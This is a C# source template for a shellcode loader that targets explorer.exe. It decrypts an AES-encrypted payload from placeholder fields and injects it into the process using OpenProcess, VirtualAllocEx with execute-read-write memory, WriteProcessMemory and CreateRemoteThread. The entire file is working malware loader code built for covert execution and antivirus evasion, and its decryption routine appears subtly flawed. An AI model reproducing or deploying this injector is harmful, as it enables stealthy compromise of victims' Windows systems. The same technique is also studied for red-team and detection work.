// c# inject into explorer.exe
// https://github.com/skahwah
//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:FILENAME_TEMPLATE.exe FILENAME_TEMPLATE.cs

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace VanillaInjection
{
    class VanillaInjection
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {   

            Process[] expProc = Process.GetProcessesByName("explorer");
            int procPid = expProc[0].Id;

            byte[] passwordBytes = new byte[] AES_KEY_TEMPLATE
            byte[] saltBytes = new byte[] AES_SALT_TEMPLATE
            byte[] encryptedShellcode = new byte[] PAYLOAD_TEMPLATE
            byte[] shellcode = DecryptShellcode(passwordBytes, saltBytes, encryptedShellcode);

            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, procPid);

            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);

            IntPtr hThread = CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }

        static byte[] DecryptShellcode(byte[] passwordBytes, byte[] saltBytes, byte[] shellcode)
        {
            byte[] decryptedString;
           
            RijndaelManaged rj = new RijndaelManaged();

            try
            {
                rj.KeySize = 256;
                rj.BlockSize = 128;
                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                rj.Key = key.GetBytes(rj.KeySize / 8);
                rj.IV = key.GetBytes(rj.BlockSize / 8);
                rj.Mode = CipherMode.CBC;

                MemoryStream ms = new MemoryStream(shellcode);

                using (CryptoStream cs = new CryptoStream(ms, rj.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.Read(shellcode, 0, shellcode.Length);
                    decryptedString = ms.ToArray();
                }
            }
            finally
            {
                rj.Clear();
            }

            return decryptedString;
        }
    }
}